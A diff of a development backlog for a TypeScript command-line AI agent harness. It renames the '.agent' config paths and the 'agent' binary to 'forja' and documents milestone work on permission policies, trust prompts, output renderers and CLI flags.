-- Multi-file policy in a layer (e.g., `~/.config/agent/permissions.d/*.yaml`).
+- Multi-file policy in a layer (e.g., `~/.config/forja/permissions.d/*.yaml`).
   Single file per layer for now; conf.d-style fragments deferred.
 
 **Pending:** none for this step.
@@ -39115,7 +40419,7 @@ spends it.
 **Next:** M2 / Step 4 — Trust prompt + permission hierarchy. New
 directory / unknown `AGENTS.md` requires confirmation; merge
 enterprise → user → project → session policy resolution. Fixes a
-gap from M1 where `./.agent/permissions.yaml` was the only source.
+gap from M1 where `./.forja/permissions.yaml` was the only source.
 
 ---
 
@@ -39352,7 +40656,7 @@ before shipping. Each fix has a regression test where unit-testable.
 - `src/harness/loop.ts` — emits the lifecycle events around each step, around each tool invocation, and around the session itself. `safeEmit` helper makes the integration crash-proof.
 - `src/harness/invoke-tool.ts` — `InvokeToolResult` now carries the `Decision | null` so the loop can fire `tool_decided` events for renderers (null when the tool wasn't found, since no decision happened).
 - `src/cli/args.ts` — hand-rolled parser. Flags: `--version`/`-v`, `--help`/`-h`, `--json`, `--model <id>`, `--max-steps <n>`. Unknown flag → reject with diagnostic. Anything not a flag is collected as the prompt (joined by spaces).
-- `src/cli/bootstrap.ts` — `bootstrap(input)` builds a `HarnessConfig` from cwd + env. Default model is `anthropic/claude-sonnet-4-6`. Loads `./.agent/permissions.yaml` if present (returns `policySource: 'project'`), otherwise falls back to `defaultPolicy()` (strict + empty rules — refuses everything until explicitly configured). Migrates the DB. Registers the 6 builtin tools. Exposes `providerOverride` and `dbPath` test seams.
+- `src/cli/bootstrap.ts` — `bootstrap(input)` builds a `HarnessConfig` from cwd + env. Default model is `anthropic/claude-sonnet-4-6`. Loads `./.forja/permissions.yaml` if present (returns `policySource: 'project'`), otherwise falls back to `defaultPolicy()` (strict + empty rules — refuses everything until explicitly configured). Migrates the DB. Registers the 6 builtin tools. Exposes `providerOverride` and `dbPath` test seams.
 - `src/cli/output/{types,plain,json}.ts` — `OutputRenderer` interface, plus two implementations:
   - `plain.ts` for TTY/pipe output: assistant text streams to stdout, tool indicators and lifecycle markers go to stderr (so a piped stdout stays a clean transcript). ANSI colors only when stderr is a TTY and `NO_COLOR` is unset.
   - `json.ts` for `--json`: NDJSON lines to stdout, one per `HarnessEvent`. Spec §2.2: in `--json`, stdout is NDJSON only.
@@ -39377,7 +40681,7 @@ before shipping. Each fix has a regression test where unit-testable.
 - **`OutputRenderer` interface** sits between the harness and the actual renderer. Plain + JSON ship now; an `InkRenderer` can drop in next without touching the harness or the CLI dispatch.
 - **Stdout vs stderr split:** assistant text → stdout (clean transcript when piped); everything else (tool indicators, lifecycle markers, summary) → stderr. Aligns with spec §2.2 ("stdout puro, stderr pra log") and lets `agent "summarize X" > out.md` work intuitively.
 - **Color detection looks at `stderr.isTTY`**, not stdout. Tool indicators live on stderr; if it's piped, ANSI would corrupt the log. `NO_COLOR` env var disables colors regardless.
-- **Default policy is strict + empty.** First-time users hit a deny on every tool, which forces them to opt in via `.agent/permissions.yaml`. Surprising at first but the right default for a tool that runs `bash`. Documented in usage.
+- **Default policy is strict + empty.** First-time users hit a deny on every tool, which forces them to opt in via `.forja/permissions.yaml`. Surprising at first but the right default for a tool that runs `bash`. Documented in usage.
 - **`onEvent` is synchronous.** Async would let renderers do work before the loop continues but adds complexity (await per event) and doesn't help the current renderers. Sync + crash-proof (try/catch around each call) is the right trade for M1.
 - **`tool_decided` is skipped for unknown tools.** No decision happened; emitting an event would imply one. Renderers can rely on the invariant: if `tool_decided` fires, there's a real `Decision`.
 - **DB closes on every CLI exit path** — `try/finally` in `run.ts`. SQLite WAL leaves dangling files if not closed cleanly.
@@ -39390,9 +40694,9 @@ before shipping. Each fix has a regression test where unit-testable.
 - Plan mode (`--plan`) — M2
 - Replay (`--replay <id>`) — M2
 - Cost display (no token extraction yet) — M2
-- `--list-tools`, `--list-sessions`, `agent doctor` — M2
+- `--list-tools`, `--list-sessions`, `forja doctor` — M2
 - Capability detection beyond TTY/NO_COLOR (truecolor, locale, image protocol) — M2
-- `agent` with no prompt as REPL — M2
+- `forja` with no prompt as REPL — M2
 - Hierarchy resolution for permissions (enterprise → user → project) — M2
 
 **Pending:** none for this step. **M1 closes here.**
@@ -39702,10 +41006,10 @@ before shipping. Each fix has a regression test where unit-testable.
 - Branch `feat/m1-foundation` created from `main`.
 - `CLAUDE.md` at the root: root premise, Doc→Subsystem map, locked stack, hard rules, workflow.
 - `docs/BACKLOG.md` (this file).
-- `package.json` with scripts (`dev`, `test`, `lint`, `typecheck`, `build`) and bin `agent`.
+- `package.json` with scripts (`dev`, `test`, `lint`, `typecheck`, `build`) and bin `forja`.
 - `tsconfig.json` strict (including `noUncheckedIndexedAccess`, `exactOptionalPropertyTypes`, `verbatimModuleSyntax`).
 - `biome.json` (linter + formatter, 100 col, single quotes, semicolons).
-- `.gitignore` covering runtime state per spec §2.7 (`.agent/sessions.db`, traces, checkpoints, local memory).
+- `.gitignore` covering runtime state per spec §2.7 (`.forja/sessions.db`, traces, checkpoints, local memory).
 - `src/cli/index.ts` stub — responds to `--version` / `-v`; anything else exits 1 with a pointer to the spec.
 - Project-wide language policy: English everywhere except `docs/spec/` (PT-BR).
 
